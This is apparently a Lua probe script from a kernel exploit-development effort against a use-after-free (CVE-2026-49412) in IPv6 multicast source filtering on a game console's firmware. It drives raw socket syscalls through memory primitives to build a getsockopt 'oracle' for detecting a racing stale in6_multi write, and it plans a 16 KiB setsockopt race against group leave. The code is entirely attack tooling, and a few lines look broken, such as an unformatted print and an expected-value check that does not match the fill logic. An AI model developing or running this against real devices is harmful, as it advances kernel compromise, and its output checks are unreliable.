-- CRASH_CLASS: MODERATE
-- PROBE 1427a: IPV6_MSFILTER getsockopt readback (the missing oracle)
--
-- Every previous CVE-2026-49412 attempt measured return codes and process
-- canaries, so "no UAF" was unfalsifiable: a stale in6_multi write leaves no
-- return-code trace. This probe asks whether getsockopt(IPPROTO_IPV6, 74) reads
-- a live filter list back. If it does, then a racing setsockopt that lands in a
-- reclaimed in6_multi becomes observable - the source list of the *other* group
-- changes - and the race gets a detector.
--
-- Prior art:
--   50f results/phase11_network_attacks/50f_ipv6_msfilter_aligned_20261022_183727.txt
--       aligned 152-byte __msfilterreq: join 0, INCLUDE/EXCLUDE 0src 0, INCLUDE 1src 0,
--       invalid mode 99 -1, 148-byte struct -1, invalid family -1
--   50g .../50g_ipv6_msfilter_source_sizes_20261022_184026.txt
--       1/16/64/128 sources accepted, 256 rejected
--   50w .../50w_ipv6_msfilter_valid_call_race_20261022_195515.txt
--       173 accepted / 1875 rejected during 2048 leave/rejoin pairs, no UAF
--   docs/CVE-2026-49412-PS5-14.10.md, docs/IPV6_ANCILLARY_14_10.md
--   CLAUDE.md still claims option 74 is uniformly refused; 50f refutes that with
--   the corrected layout, so the claim is a stale defect artefact.
--
-- Layout on amd64 (from 50f): __msfilterreq = ifindex dword +0, mode dword +4,
-- numsrc dword +8, padding +12, sockaddr_storage group +16 (128 bytes),
-- msfr_srcs pointer +144, sizeof = 152. Source entries are 128 bytes each
-- (sockaddr_storage), which is what makes a 128-source request a 16 KiB copyin.

print("=== PROBE 1427a: IPV6_MSFILTER READBACK ORACLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function z(p, n) for i = 0, n - 1 do memory.write_byte(p + i, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function d(p, i, v) memory.write_dword(p + i, v) end
local function rd(p, i) return to_num(memory.read_dword(p + i)) end
local function rb(p, i) return to_num(memory.read_byte(p + i)) end

local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41
local JOIN, LEAVE, MSFILTER = 12, 13, 74
local socket, getsockopt, setsockopt, close = sc(97), sc(118), sc(105), sc(6)

-- one socket per group so the two readbacks cannot alias
local function newsock()
    local fd = to_num(socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 or fd > 4096 then return nil end
    return fd
end

-- mreq for IPV6_JOIN_GROUP: ipv6_mreq = in6_addr(16) + ifindex dword at +16
local function join(fd, tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -1
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(JOIN), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end

-- source entry is 128 bytes; put a unique address at offset 0 of each entry
local function fill_sources(sa, n, base)
    z(sa, n * 128)
    for i = 0, n - 1 do
        local e = sa + i * 128
        b(e, 0, 28)              -- sin6_len
        b(e, 1, AF_INET6)        -- sin6_family
        d(e, 4, 0)               -- flowinfo
        b(e, 8, 0x20); b(e, 9, 0x01)
        b(e, 22, math.floor(base / 256) % 256)
        b(e, 23, (base + i) % 256)
        d(e, 24, 1)              -- scope id
    end
end

local function prep(req, group_tag, mode, nsrc, sa)
    z(req, 160)
    d(req, 0, 1)
    d(req, 4, mode)
    d(req, 8, nsrc)
    b(req, 16, 28)
    b(req, 17, AF_INET6)
    b(req, 24, 0xff); b(req, 25, 0x02); b(req, 39, group_tag)
    d(req, 16 + 24, 1)
    if sa then
        memory.write_qword(req + 144, uint64(sa))
    else
        memory.write_qword(req + 144, uint64(0))
    end
end

local req = memory.alloc(0x100)
local sa = memory.alloc(0x20000)          -- 512 sources * 128 bytes; the
                                          -- 0x4000 version overran itself at nsrc=129
local gbuf = memory.alloc(0x200)         -- readback: 152-byte header + slack
local glen = memory.alloc(16)

local function set_filter(fd, tag, mode, n)
    local src = nil
    if n > 0 then
        fill_sources(sa, n, 0xC0)
        src = sa
    end
    prep(req, tag, mode, n, src)
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(152))
    end)
    if ok then rv = to_num(r) end
    return rv
end

-- getsockopt: caller supplies the buffer and, in msfr_srcs/msfr_numsrc, the
-- capacity for the source list the kernel writes back
local function get_filter(fd, tag, cap)
    z(gbuf, 0x200)
    d(gbuf, 0, 1)
    d(gbuf, 4, 0)
    d(gbuf, 8, cap)
    b(gbuf, 16, 28)
    b(gbuf, 17, AF_INET6)
    b(gbuf, 24, 0xff); b(gbuf, 25, 0x02); b(gbuf, 39, tag)
    d(gbuf, 16 + 24, 1)
    fill_sources(sa, cap > 0 and cap or 1, 0x00)   -- zeroed so leftovers are visible
    z(sa, cap * 128)
    memory.write_qword(gbuf + 144, uint64(sa))
    d(glen, 0, 152)
    local rv = -999
    local ok, r = pcall(function()
        return getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(gbuf), uint64(glen), uint64(0))
    end)
    if ok then rv = to_num(r) end
    local n = rd(gbuf, 8)
    local out = {}
    if rv == 0 then
        for i = 0, math.min(n, 4) - 1 do
            local e = sa + i * 128
            out[#out + 1] = string.format("%02X%02X:%02X%02X", rb(e, 8), rb(e, 9), rb(e, 22), rb(e, 23))
        end
    end
    return rv, n, table.concat(out, " "), rd(glen, 0)
end

-- ------------------------------------------------------------------ block A
print("[A] reproduce 50f on this pid")
local fdA = newsock()
if not fdA then print("  socket() failed: " .. es()); print("=== PROBE 1427a ABORT ==="); return end
print(string.format("  socket A = %d", fdA))
print(string.format("  join group A tag 1 -> %d", join(fdA, 1)))
print(string.format("  set INCLUDE 0src  -> %d", set_filter(fdA, 1, 1, 0)))
print(string.format("  set EXCLUDE 0src  -> %d", set_filter(fdA, 1, 2, 0)))
print(string.format("  set INCLUDE 1src  -> %d", set_filter(fdA, 1, 1, 1)))

-- ------------------------------------------------------------------ block B
print("[B] getsockopt(the oracle)")
local rv, n, names, gotlen = get_filter(fdA, 1, 128)
print(string.format("  getsockopt -> rv=%d numsrc=%d len=%d sources=[%s]", rv, n, gotlen, names))
if rv ~= 0 then
    print("  NOTE: readback refused (" .. es() .. "); the oracle does not exist in this shape")
end

-- ------------------------------------------------------------------ block C
print("[C] set 8 sources then read them back")
print(string.format("  set INCLUDE 8src  -> %d", set_filter(fdA, 1, 1, 8)))
rv, n, names, gotlen = get_filter(fdA, 1, 128)
print(string.format("  getsockopt -> rv=%d numsrc=%d len=%d sources=[%s]", rv, n, gotlen, names))

-- ------------------------------------------------------------------ block D
print("[D] source-count ceiling between 128 and 256")
for _, c in ipairs({ 128, 129, 130, 192, 256, 257, 384, 512 }) do
    local okc = set_filter(fdA, 1, 1, c)
    print(string.format("  nsrc=%-4d set -> %-6d errno=%s", c, okc, okc == 0 and "-" or es()))
    if okc ~= 0 and c > 128 then break end
end
-- full 128-source round trip: does the readback cover the whole filter list?
local rr, nn, ss, rlen = get_filter(fdA, 1, 128)
print(string.format("  readback after 128-source set: rv=%d numsrc=%d len=%d", rr, nn, rlen))
if rr == 0 and nn > 0 then
    local e = sa + (nn - 1) * 128
    print(string.format("    last source bytes %02X%02X:%02X%02X (expect 2001:%02X%02X)",
        rb(e, 8), rb(e, 9), rb(e, 22), rb(e, 23), 0xC0 + (nn - 1), 0xC0 + (nn - 1)))
end

-- ------------------------------------------------------------------ block E
print("[E] two groups, two filters: a real oracle must not alias")
local fdB = newsock()
if fdB then
    print(string.format("  socket B = %d", fdB))
    print(string.format("  join group B tag 2 -> %d", join(fdB, 2)))
    print(string.format("  A: INCLUDE 2src -> %d", set_filter(fdA, 1, 1, 2)))
    print(string.format("  B: INCLUDE 5src -> %d", set_filter(fdB, 2, 1, 5)))
    local r1, n1, s1 = get_filter(fdA, 1, 128)
    local r2, n2, s2 = get_filter(fdB, 2, 128)
    print(string.format("  A readback rv=%d numsrc=%d [%s]", r1, n1, s1))
    print(string.format("  B readback rv=%d numsrc=%d [%s]", r2, n2, s2))
    if r1 == 0 and r2 == 0 and n1 == 2 and n2 == 5 then
        print("  >>> ORACLE WORKS: per-group filter state is readable from userland")
    else
        print("  >>> oracle partial: numsrc A=%d B=%d (expected 2 and 5)", n1, n2)
    end
    close(uint64(fdB))
end

close(uint64(fdA))
print("")
print("[F] reading")
print("  rv=0 with numsrc=8 and matching source bytes in [C] means getsockopt(74)")
print("  returns the live filter list. That is the detector for a stale in6_multi")
print("  write: race a 16 KiB (128-source) setsockopt against LEAVE, then read every")
print("  group and look for sources that were never set on it.")
print("")
print("=== PROBE 1427a COMPLETE ===")
